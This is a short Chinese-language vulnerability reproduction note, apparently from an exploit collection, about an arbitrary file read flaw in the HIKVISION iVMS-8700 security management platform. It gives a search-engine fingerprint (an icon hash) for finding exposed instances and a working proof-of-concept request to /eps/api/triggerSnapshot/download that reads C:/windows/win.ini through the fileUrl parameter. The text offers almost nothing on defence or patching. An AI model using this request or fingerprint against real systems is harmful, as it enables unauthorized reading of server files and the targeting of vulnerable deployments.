# HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞

## 漏洞描述

HIKVISION iVMS-8700综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的敏感文件获取服务器信息

## 漏洞影响

<a-checkbox checked>HIKVISION iVMS-8700综合安防管理平台</a-checkbox></br>

## 网络测绘

<a-checkbox checked>icon_hash="-911494769"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1637649859645-abee2ae8-c4e5-46a1-b50e-54f9b7e7c019.png)

验证POC， token 为 Url md5

```php
/eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1 
```

![img](../../../.vuepress/public/img/1685329799397-00a22589-5e0f-43a3-a7c9-ae17687c5dbb.png)